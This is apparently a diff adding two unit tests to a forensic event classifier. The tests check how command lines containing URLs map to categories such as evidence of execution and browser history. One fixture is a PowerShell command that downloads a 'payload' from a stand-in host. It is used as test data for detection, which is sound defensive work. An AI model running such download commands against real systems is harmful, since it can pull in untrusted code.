@@ -43,5 +43,27 @@ def test_usb_registry_observation_is_classified_by_exact_event_semantics():
     assert ArtifactClassifier.classify_event(event) is ArtifactCategory.REGISTRY_ARTIFACTS
 
 
+def test_execution_command_with_url_prefers_execution_semantics():
+    event = {
+        "source": "",
+        "event_id": "",
+        "event_type": "",
+        "command_line": "powershell.exe -Command Invoke-WebRequest https://example.test/payload",
+    }
+
+    assert ArtifactClassifier.classify_event(event) is ArtifactCategory.EVIDENCE_OF_EXECUTION
+
+
+def test_url_only_command_line_fallback_still_maps_to_browser_history():
+    event = {
+        "source": "",
+        "event_id": "",
+        "event_type": "",
+        "command_line": "https://example.test/page",
+    }
+
+    assert ArtifactClassifier.classify_event(event) is ArtifactCategory.BROWSER_HISTORY
+
+
 def test_category_mapping_keys_match_classifier_normalization_contract():
     assert all(key == key.lower() for key in ArtifactClassifier.CATEGORY_MAPPING)
